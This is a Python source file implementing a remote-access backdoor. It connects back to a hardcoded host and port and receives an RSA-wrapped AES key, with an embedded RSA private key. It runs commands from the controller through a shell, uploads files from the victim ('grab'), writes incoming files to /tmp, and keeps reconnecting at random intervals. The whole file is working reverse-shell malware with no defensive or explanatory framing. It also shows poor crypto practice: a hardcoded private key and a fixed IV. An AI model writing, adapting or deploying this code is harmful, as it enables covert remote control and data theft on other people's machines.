import socket,subprocess,os,time,random
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"H" * 16

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send('Unable to find out the file'.encode())

def get_file(s):
    f = open('/tmp/jadi.py', 'wb')
    while 1:
        data = s.recv(1024)
        if data.endswith('DONE'.encode()):
            f.write(data[:-4])
            f.close()
            print('[+] Transfer completed')
            break
        if 'File not found'.encode() in data:
            print('[-] unable to find out the file')
            break
        f.write(data)
    
def GET_AES(cipher):
    private = '''-----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(private)
    decryptor = PKCS1_OAEP.new(private_key)
    return decryptor.decrypt(cipher).decode()

def encrypt(message):
    encryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect(HOST,PORT):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))

    global AES_KEY
    AES_KEY = s.recv(4096)
    AES_KEY = GET_AES(AES_KEY)
    AES_KEY = AES_KEY.encode()
    while 1:
        command = s.recv(4096)
        command = decrypt(command).decode()
        if 'terminate' in command:
            return 1

        elif 'send_file' in command:
            get_file(s)

        elif 'cd' in command:
            code , directory = command.split(" ")
            try:
                os.chdir(directory)
                s.send(encrypt(b'[+] change directory to ' + os.getcwd().encode()))
            except Exception as e:
                s.send((b'[-] CWD is' + str(e).encode()))  

        elif 'grab' in command:
            grab, path = command.split("*")

            try:
                transfer(s,path)
            except Exception as e:
                s.send((b'[-] CWD is' + str(e).encode())) 
        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = CMD.stdout.read() + CMD.stderr.read()
            s.send(encrypt(result))

if __name__ == '__main__':
    HOST = '192.168.1.4'
    PORT = 5555
    while 1:
        try:
            if connect(HOST,PORT) == 1:
                break
        except:
            sleep_for = random.randrange(1,10)
            time.sleep(int(sleep_for))
            pass


